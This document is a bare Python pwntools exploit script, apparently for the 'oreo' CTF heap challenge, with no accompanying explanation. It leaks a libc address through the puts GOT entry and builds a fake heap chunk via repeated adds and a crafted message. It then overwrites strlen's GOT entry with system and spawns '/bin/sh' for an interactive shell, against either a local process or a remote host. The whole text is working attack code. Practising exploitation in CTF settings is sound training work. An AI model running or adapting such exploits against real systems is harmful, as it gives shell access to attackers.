#!/usr/bin/env python3

from pwn import *

context(os="linux", arch="i386", log_level="debug")
localfile = "./oreo"
locallibc = "/lib/i386-linux-gnu/libc.so.6"

def add(name, desc):
    # io.recvuntil(": ")
    io.sendline(str(1))
    # io.recvuntil("name: ")
    io.sendline(name)
    # io.recvuntil("description: ")
    io.sendline(desc)

def order():
    io.sendline(str(3))
    # io.sendlineafter("Action: ", str(3))

def leave_message(msg):
    io.sendline(str(4))
    # io.sendlineafter("Action: ", str(4))
    io.sendline(msg)
    # io.sendlineafter("your order: ", msg)

def exp():
    io.recvuntil("6. Exit!\n")
    # leak libc
    puts_got = 0x804A248
    payload = b"A"*27 + p32(puts_got)
    add(payload, "B")
    gdb.attach(io, "b *0x8048A25")
    io.sendline(str(2))
    io.recvuntil("Description: ")
    io.recvuntil("Description: ")
    puts_addr = u32(io.recv(4))
    libc_base = puts_addr - libc.sym["puts"]
    log.debug("libc base: 0x%x" % libc_base)

    # constructe fake chunk
    for i in range(0x3e):
        add("A", "B")
    add(b"A"*27+p32(0x804A2A8), "B")
    payload = b"\x00"*0x20 + p32(0) + p32(0x100)
    leave_message(payload)
    order()

    # attack
    strlen_got = elf.got["strlen"]
    add("A", p32(strlen_got))
    # gdb.attach(io, "b *0x8048A25")
    system_addr = libc_base + libc.sym["system"]
    leave_message(p32(system_addr) + b";/bin/sh")

    

    io.interactive()





argc = len(sys.argv)
if argc == 1:
    io = process(localfile)
else:
    if argc == 2:
        host, port = sys.argv[1].split(":")
    elif argc == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    io = remote(host, port)
elf = ELF(localfile)
libc = ELF(locallibc)
exp()
